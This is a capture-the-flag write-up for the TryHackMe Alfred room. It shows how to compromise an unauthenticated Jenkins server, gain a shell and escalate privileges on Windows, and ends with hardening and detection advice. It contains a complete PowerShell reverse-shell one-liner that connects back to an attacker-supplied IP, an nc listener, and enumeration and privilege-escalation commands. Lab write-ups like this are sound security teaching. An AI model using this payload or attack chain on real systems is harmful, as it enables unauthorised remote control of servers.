# TryHackMe Alfred - CTF Challenge Writeup

## Challenge Information

• **Platform:** TryHackMe
• **Category:** Web Application Security
• **Difficulty:** Easy
• **Points:** 100
• **Target:** Windows Server with Jenkins CI/CD

## Challenge Description

Alfred is a Windows-based vulnerable machine that demonstrates common CI/CD security misconfigurations. The objective is to gain initial access through an exposed Jenkins instance and escalate privileges to obtain both user and root flags. This challenge teaches fundamental concepts of web application exploitation and Windows privilege escalation.

## Initial Setup and Reconnaissance

### 1. Environment Setup

• Deploy the Alfred machine on TryHackMe
• Note the assigned target IP address
• Ensure network connectivity from attacking machine

### 2. Network Reconnaissance

#### Port Scanning

Initial Nmap scan to identify open services:

```bash
nmap -sC -sV -oA alfred <target_ip>
```

**Key Findings:**
• Port 80: HTTP (Microsoft IIS)
• Port 8080: HTTP (Jenkins CI/CD Server)
• Port 3389: Microsoft Terminal Services (RDP)

#### Service Enumeration

Detailed service enumeration:

```bash
nmap -p 80,8080,3389 -sC -sV -A <target_ip>
```

**Service Details:**
• **Port 80:** Microsoft IIS 7.5 - Standard web server
• **Port 8080:** Jetty 9.4.z-SNAPSHOT - Jenkins application
• **Port 3389:** RDP service (filtered/restricted)

## Vulnerability Identification

### Primary Vulnerability: Unauthenticated Jenkins Access

**Description:** The Jenkins instance on port 8080 is accessible without authentication, allowing unrestricted administrative access.

**Impact:**
• Administrative access to Jenkins dashboard
• Ability to create and execute build jobs
• Code execution on the underlying Windows system
• Potential for privilege escalation

### Secondary Findings

1. **Weak Network Segmentation:** CI/CD system not properly isolated
2. **Excessive Service Privileges:** Jenkins running with elevated permissions
3. **Missing Access Controls:** No authentication barriers on critical services

## Exploitation Methodology

### Phase 1: Initial Access via Jenkins

#### Step 1: Jenkins Reconnaissance

1. Navigate to `http://<target_ip>:8080`
2. Confirm Jenkins dashboard is accessible without authentication
3. Explore available features and administrative functions

#### Step 2: Malicious Build Job Creation

**Manual Approach:**
1. Click "New Item" in Jenkins dashboard
2. Enter job name: `pwn_job`
3. Select "Freestyle project"
4. Configure build steps for payload execution

**Automated Approach:**
Use the provided exploitation script:

```bash
python3 /challenges/web/tryhackme-alfred/exploit.py <target_ip> <local_ip> <local_port>
```

#### Step 3: Reverse Shell Payload

**PowerShell Reverse Shell:**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<local_ip>',<local_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Step 4: Payload Execution

1. **Setup listener:**
   ```bash
   nc -lvnp 4444
   ```

2. **Trigger build job:**
   - Manual: Click "Build Now" in Jenkins
   - Automated: Script handles trigger automatically

3. **Verify shell access:**
   ```cmd
   whoami
   hostname
   systeminfo
   ```

### Phase 2: System Enumeration

#### User Context Analysis

```cmd
whoami
whoami /priv
whoami /groups
net user %username%
```

**Initial Access Results:**
• User: `alfred\bruce`
• Privileges: Standard user with some service permissions
• Groups: Various local groups

#### System Information Gathering

```cmd
systeminfo
hostname
ipconfig /all
net users
net localgroup administrators
```

**Key System Details:**
• OS: Windows Server 2008 R2
• Architecture: x64
• Current user: bruce
• Administrators: Administrator, bruce (not yet elevated)

### Phase 3: Privilege Escalation

#### Method 1: Token Impersonation

**Check for SeImpersonatePrivilege:**
```cmd
whoami /priv | findstr "SeImpersonatePrivilege"
```

**If available, use token impersonation techniques:**
• Upload and execute privilege escalation tools
• Leverage service account tokens
• Escalate to SYSTEM privileges

#### Method 2: Service Exploitation

**Service Enumeration:**
```cmd
sc query
wmic service get name,displayname,pathname,startmode
```

**Look for:**
• Unquoted service paths
• Weak service permissions
• Services running as SYSTEM

### Phase 4: Flag Collection

#### User Flag

**Location:** Typically in user's Desktop or Documents folder
```cmd
dir C:\Users\bruce\Desktop\user.txt
type C:\Users\bruce\Desktop\user.txt
```

#### Root Flag

**After privilege escalation to Administrator/SYSTEM:**
```cmd
dir C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
```

## Solution Summary

### Attack Chain

1. **Discovery:** Unauthenticated Jenkins on port 8080
2. **Initial Access:** Malicious build job with PowerShell reverse shell
3. **Enumeration:** System and user context analysis
4. **Privilege Escalation:** Token impersonation or service exploitation
5. **Flag Collection:** User and root flags retrieved

### Flags Obtained

**User Flag:** `[flag_content]`
**Root Flag:** `[flag_content]`

*Note: Replace with actual flag values when completing the challenge*

## Tools and Scripts Reference

### Exploitation Script

**Location:** `/challenges/web/tryhackme-alfred/exploit.py`

**Usage:**
```bash
python3 exploit.py <target_ip> <local_ip> <local_port>
```

**Features:**
• Automated Jenkins reconnaissance
• Malicious job creation
• Payload execution
• CSRF token handling
• Error handling and cleanup

### Payload Collection

**Location:** `/challenges/web/tryhackme-alfred/payloads.txt`

**Contents:**
• PowerShell reverse shells
• Windows enumeration commands
• Privilege escalation techniques
• Persistence mechanisms
• Cleanup commands

### Key Payloads Used

**System Enumeration:**
```cmd
whoami /priv
systeminfo
net users
sc query
```

**Privilege Escalation Check:**
```cmd
whoami /priv | findstr "SeImpersonatePrivilege"
wmic service get name,displayname,pathname,startmode
```

## Key Learning Points

### 1. CI/CD Security

**Authentication Importance:**
• Never deploy Jenkins without proper authentication
• Implement role-based access controls
• Use secure authentication mechanisms (LDAP, SSO)

**Network Segmentation:**
• Isolate CI/CD systems from production networks
• Implement proper firewall rules
• Monitor CI/CD system access and activities

### 2. Windows Security

**Service Account Security:**
• Run services with minimal required privileges
• Avoid using administrative accounts for services
• Regularly audit service permissions

**Token Management:**
• Understand Windows token impersonation risks
• Monitor for privilege escalation attempts
• Implement proper access controls

### 3. Web Application Security

**Default Configurations:**
• Always change default credentials and settings
• Disable unnecessary features and endpoints
• Implement proper authentication before deployment

**Security Testing:**
• Regular vulnerability assessments
• Penetration testing of CI/CD pipelines
• Security code reviews

### 4. Attack Methodology

**Reconnaissance Importance:**
• Thorough port scanning and service enumeration
• Understanding application functionality
• Identifying security misconfigurations

**Privilege Escalation Techniques:**
• System enumeration and privilege analysis
• Service exploitation methods
• Token impersonation attacks

## Recommendations

### Immediate Security Improvements

1. **Enable Jenkins Authentication:**
   ```groovy
   // Configure security realm and authorization strategy
   import jenkins.model.*
   import hudson.security.*
   
   def instance = Jenkins.getInstance()
   def strategy = new FullControlOnceLoggedInAuthorizationStrategy()
   instance.setAuthorizationStrategy(strategy)
   instance.save()
   ```

2. **Network Segmentation:**
   • Move Jenkins to isolated network segment
   • Implement firewall rules restricting access
   • Use VPN for administrative access

3. **Service Hardening:**
   ```cmd
   # Run Jenkins with limited service account
   sc config Jenkins obj= "NT SERVICE\Jenkins"
   ```

### Long-term Security Strategy

1. **Security Monitoring:**
   • Implement logging and monitoring for Jenkins
   • Set up alerts for suspicious activities
   • Regular security audits

2. **Access Management:**
   • Implement proper user provisioning/deprovisioning
   • Regular access reviews
   • Multi-factor authentication

3. **Vulnerability Management:**
   • Regular security updates and patches
   • Vulnerability scanning
   • Security testing integration in CI/CD pipeline

## Detection and Prevention

### Detection Strategies

**Network Monitoring:**
• Monitor for unusual outbound connections from CI/CD systems
• Detect PowerShell execution in unexpected contexts
• Alert on privilege escalation attempts

**System Monitoring:**
• Monitor Jenkins job creation and execution
• Track user privilege changes
• Log administrative actions

### Prevention Measures

**Secure Configuration:**
• Enable Jenkins security features
• Implement proper authentication and authorization
• Regular security configuration reviews

**Network Security:**
• Network segmentation and isolation
• Firewall rules and access controls
• VPN for administrative access

## Conclusion

The TryHackMe Alfred challenge effectively demonstrates the critical importance of proper CI/CD security configuration. The vulnerability chain from unauthenticated Jenkins access to full system compromise highlights how security misconfigurations can lead to complete system takeover.

**Key Takeaways:**
• CI/CD systems require the same security attention as production systems
• Default configurations are rarely secure and must be hardened
• Network segmentation is crucial for containing security breaches
• Regular security testing should include CI/CD infrastructure
• Privilege escalation techniques are essential knowledge for both attackers and defenders

**Skills Developed:**
• Web application vulnerability assessment
• CI/CD security testing
• Windows system enumeration
• Privilege escalation techniques
• Python automation scripting
• PowerShell payload development

This challenge provides excellent hands-on experience with real-world security scenarios and emphasizes the importance of secure DevOps practices in modern software development environments.

## References

• [TryHackMe Alfred Room](https://tryhackme.com/room/alfred)
• [Jenkins Security Documentation](https://www.jenkins.io/doc/book/security/)
• [Windows Privilege Escalation Guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
• [PowerShell Reverse Shell Techniques](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
• [OWASP CI/CD Security Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)

---

**Disclaimer:** This writeup is for educational purposes only. Only use these techniques on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal and unethical.

**Challenge Completed:** September 2025  
**Platform:** TryHackMe Alfred Room  
**Difficulty:** Easy  
**Focus Areas:** Web Security, CI/CD Security, Windows Privilege Escalation
